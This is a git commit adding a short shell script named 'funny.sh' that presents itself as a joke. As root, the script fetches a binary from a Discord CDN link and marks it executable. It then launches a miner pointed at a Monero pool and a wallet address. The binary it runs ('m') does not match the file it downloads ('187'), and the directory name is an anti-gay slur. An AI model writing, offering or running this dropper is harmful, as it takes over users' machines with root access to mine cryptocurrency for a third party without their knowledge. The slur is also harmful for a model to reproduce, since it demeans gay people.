ade7e8d6e6bf77120370406e7b8da2314a8cfed8
oksksdaksa <141076347+oksksdaksa@users.noreply.github.com>
2023-07-31 23:13:45 +0200

    Add files via upload

---
+++ funny.sh
@@ -0,0 +1,6 @@
+echo this can run commands in terminal tho
+sudo mkdir /fag/ 
+sudo wget https://cdn.discordapp.com/attachments/697624882250383483/818939588265246720/187 -P /fag 
+cd /fag/
+sudo chmod +x 187
+sudo ./m -o xmr.bohemianpool.com:6666 -u 44oddE7dqKs6z3dXbhTJF83LuDvNoysiJ54b5qap7XMAUr84ziPGXX465kFpRC34eLRynK5Df4M7nBdCA4kXQyz63kuAyQR
